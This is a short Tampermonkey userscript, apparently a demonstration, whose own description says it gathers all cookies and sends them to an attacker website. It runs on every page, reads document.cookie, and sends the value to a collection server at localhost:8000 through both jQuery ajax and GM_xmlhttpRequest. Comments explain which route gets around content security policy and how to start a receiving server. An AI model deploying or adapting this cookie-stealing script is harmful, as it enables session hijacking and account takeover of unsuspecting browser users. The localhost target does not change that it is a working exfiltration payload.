// ==UserScript==
// @name         Cookie
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  get all the cookie and send to attacker website
// @author       Guangrui Wang
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @require      https://code.jquery.com/jquery-latest.js
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// ==/UserScript==

/**
 * You can copy this script to your tampermonkey and run it on any website
 * You also need to run a server to receive the data
 * For example, you can run a python server by using the following command
 * python -m SimpleHTTPServer 8000
 */

// this import jquery to env
let $ = window.jQuery;
let cookie = document.cookie;
(function() {
    'use strict';
    console.log(cookie);
    //restrict by csp
    //send ajax to attacker website with jqury
    $.ajax({
       url: "http://localhost:8000/cookie?" + cookie,
       type: "GET",
    });
    //Not restrict by csp,but will alert the user before grant access
    GM_xmlhttpRequest({
        method: "GET",
        url: "http://localhost:8000/cookie?" + cookie,
    });
})();